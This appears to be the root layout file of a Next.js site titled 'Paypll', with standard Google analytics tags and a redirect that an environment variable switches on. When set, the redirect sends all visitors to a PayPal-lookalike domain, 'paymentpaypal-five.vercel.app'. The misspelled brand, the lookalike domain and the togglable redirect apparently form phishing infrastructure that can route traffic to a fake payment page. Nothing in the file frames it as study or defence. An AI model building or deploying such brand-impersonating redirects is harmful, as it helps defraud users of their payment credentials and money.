import type { Metadata } from 'next'
import Script from 'next/script'
import './globals.css'
import { redirect } from 'next/navigation'

export const metadata: Metadata = {
  title: 'Paypll',
  description: 'Created with v0',
  generator: 'v0.dev',
  other: {
    'google-site-verification': 'lHHsqn3XdZBLMi0JW7dKzw_0Jv8xrRhQxFyBmsHlJes',
  },
}

const REDIRECT = process.env.NEXT_PUBLIC_REDIRECT

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  // Server-side redirect (App Router)
  if ((REDIRECT ?? '').toLowerCase() === 'yes') {
    redirect('https://paymentpaypal-five.vercel.app/')
  }

  return (
    <html lang="en">
      <head>
        {/* Google Tag (gtag.js) */}
        <Script
          async
          src="https://www.googletagmanager.com/gtag/js?id=G-TJD43J0CLB"
          strategy="afterInteractive"
        />
        <Script id="google-gtag" strategy="afterInteractive">
          {`
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-TJD43J0CLB');
          `}
        </Script>

        {/* Google Tag Manager */}
        <Script id="google-tag-manager" strategy="afterInteractive">
          {`
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer','GTM-PVPTS4KH');
          `}
        </Script>
      </head>
      <body>
        {/* Google Tag Manager (noscript) */}
        <noscript>
          <iframe
            src="https://www.googletagmanager.com/ns.html?id=GTM-PVPTS4KH"
            height="0"
            width="0"
            style={{ display: 'none', visibility: 'hidden' }}
          />
        </noscript>

        {children}
      </body>
    </html>
  )
}
